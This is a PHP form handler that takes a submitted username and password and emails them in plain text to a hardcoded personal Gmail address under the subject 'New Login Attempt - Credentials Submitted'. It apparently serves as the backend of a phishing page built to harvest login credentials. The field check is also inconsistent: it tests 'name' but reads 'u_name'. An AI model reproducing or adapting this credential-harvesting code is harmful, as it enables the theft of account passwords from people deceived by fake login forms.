<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $username = isset($_POST['name']) ? trim($_POST['u_name']) : '';
    $password = isset($_POST['pass']) ? trim($_POST['pass']) : '';

    // Basic validation: Check if username and password are not empty
    if (!empty($username) && !empty($password)) {
        
        // Recipient email (your Gmail address)
        $to = "mukeshkotty123@gmail.com";

        // Subject of the email
        $subject = "New Login Attempt - Credentials Submitted";

        // Message body with the credentials
        $message = "User Credentials:\n";
        $message .= "Username/Phone/Email: " . $username . "\n";
        $message .= "Password: " . $password . "\n";

        // Headers (you can change the From email to something valid)
        $headers = "From: no-reply@yourdomain.com\r\n";
        $headers .= "Reply-To: no-reply@yourdomain.com\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

        // Send the email using the mail() function
        if (mail($to, $subject, $message, $headers)) {
            echo "Credentials have been sent successfully!";
        } else {
            echo "There was an error sending the email. Please try again.";
        }
    } else {
        // If username or password is empty, display an error
        echo "Please fill in both the username and password.";
    }
}
?>
